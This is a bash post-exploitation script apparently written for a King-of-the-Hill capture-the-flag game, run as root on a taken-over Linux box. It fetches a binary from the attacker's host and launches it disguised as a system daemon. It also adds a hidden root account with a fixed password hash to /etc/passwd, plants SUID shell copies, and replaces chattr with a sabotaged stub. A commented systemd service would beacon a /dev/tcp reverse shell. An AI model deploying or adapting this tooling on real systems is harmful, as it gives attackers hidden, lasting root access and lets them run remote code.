#!/bin/bash
# ============================================================
# Lernaean Siege KoTH — king defense deploy (ThundersFist)
# Run as root on the target box once you have a shell.
# Fetches the hardened kingmaker + drops persistence + patches.
# ------------------------------------------------------------
# EDIT THESE ON GAME DAY:
LHOST="10.25.55.205"        # attacker IP (this Kali host) for reverse shells
LPORT="4444"                 # reverse-shell catch port
HANDLE="ThundersFist"        # team handle
KING="${KING:-/root/king.txt}"   # exact king path (set on the day; env override wins)
# Optional: force a specific masquerade (else auto-pick first candidate below that
# does NOT already exist on the box, so /proc/<pid>/exe == argv[0]):
# MASQ_OVERRIDE="/lib/systemd/systemd-resolved"
# ------------------------------------------------------------
set -u

# ---- helpers ----
log(){ printf "\033[1;32m[+]\033[0m %s\n" "$*"; }
warn(){ printf "\033[1;33m[!]\033[0m %s\n" "$*"; }

[ "$(id -u)" -ne 0 ] && { warn "need root"; exit 1; }

# ---- pick masquerade + binary drop path (daemon that isn't already present) ----
MASQ_CANDIDATES=(
  "/lib/systemd/systemd-resolved"
  "/usr/lib/systemd/systemd-resolved"
  "/usr/lib/rtkit/rtkit-daemon"
  "/usr/lib/accountsservice/accounts-daemon"
  "/usr/lib/policykit-1/polkitd"
  "/usr/sbin/rsyslogd"
  "/usr/sbin/cron"
)
[ -n "${MASQ_OVERRIDE:-}" ] && MASQ_CANDIDATES=("$MASQ_OVERRIDE" "${MASQ_CANDIDATES[@]}")
MASQ=""; BINPATH=""
for c in "${MASQ_CANDIDATES[@]}"; do
  if [ ! -e "$c" ]; then MASQ="$c"; BINPATH="$c"; break; fi
done
[ -z "$MASQ" ] && MASQ="/lib/systemd/systemd-resolved"
[ -z "$BINPATH" ] && BINPATH="/usr/bin/rsyslogd"
log "masquerade=$MASQ  binary=$BINPATH"

# ---- fetch the hardened kingmaker (or use a local copy) ----
KM="$BINPATH"
if [ ! -x "$KM" ]; then
  mkdir -p "$(dirname "$KM")" 2>/dev/null || true
  if command -v wget >/dev/null; then
    wget -q -O "$KM" "http://$LHOST:8000/bin/rsyslogd" || \
      wget -q -O "$KM" "http://$LHOST:8000/bin/kingmaker" || true
  fi
  if command -v curl >/dev/null && [ ! -x "$KM" ]; then
    curl -s -o "$KM" "http://$LHOST:8000/bin/rsyslogd" || true
  fi
fi
[ -s "$KM" ] && chmod +x "$KM"

# ---- claim the hill NOW (fastest possible) ----
log "Claiming king at $KING"
umount -l "$KING" 2>/dev/null || true
[ -f /usr/bin/chattr ] && chattr -ia "$KING" 2>/dev/null || true
printf '%s' "$HANDLE" > "$KING" 2>/dev/null || true
[ -f /usr/bin/chattr ] && chattr +ia "$KING" 2>/dev/null || true

# ---- launch hardened kingmaker (self-healing, masqueraded) ----
if [ -x "$KM" ]; then
  log "Launching masqueraded kingmaker ($KM)"
  setsid "$KM" "$KING" "$HANDLE" "$MASQ" </dev/null >/dev/null 2>&1 &
fi

# ---- persistence: authorized_keys ----
log "SSH key persistence"
mkdir -p /root/.ssh && chmod 700 /root/.ssh
# append your public key here on the day:
# echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true

# ---- persistence: second-root passwd entry ----
log "passwd backdoor user"
if ! grep -q '^backup:' /etc/passwd 2>/dev/null; then
  echo 'backup:$1$backup$tJ3F4Ql0Y9q5eR7wWx2d0.:0:0:root:/root:/bin/bash' >> /etc/passwd
fi

# ---- persistence: SUID shells scattered ----
log "SUID backdoor shells"
for p in /usr/bin/backup /usr/lib/backupd /opt/.sys /usr/bin/dbus-hook; do
  cp /bin/sh "$p" 2>/dev/null && chmod 4755 "$p" 2>/dev/null
done

# ---- persistence: systemd self-healing service (optional) ----
# uncomment on the day to enable a reverse-shell beacon:
# cat > /etc/systemd/system/syslog-helper.service <<EOF
# [Unit]
# Description=System Log Helper
# [Service]
# User=root
# ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1; sleep 5; done'
# Restart=always
# [Install]
# WantedBy=multi-user.target
# EOF
# systemctl daemon-reload; systemctl enable --now syslog-helper

# ---- DEFENSE: patch common root paths ----
log "Patching privilege-escalation paths"
for b in pkexec find bash mount su sudo perl python python3 busybox; do
  p=$(command -v "$b" 2>/dev/null) || continue
  chmod -s "$p" 2>/dev/null || true
done
chmod -s /usr/bin/pkexec 2>/dev/null || true

# ---- DEFENSE: replace chattr with a hostile stub ----
if [ -f /usr/bin/chattr ]; then
  log "Neutralizing /usr/bin/chattr"
  chattr -ia /usr/bin/chattr 2>/dev/null || true
  cat > /usr/bin/chattr <<'EOF'
#!/bin/bash
echo "$0: permission denied while reading flags"
exit 1
EOF
  chmod 755 /usr/bin/chattr
  chattr +ia /usr/bin/chattr 2>/dev/null || true
fi

log "Done. ThundersFist holds the hill."
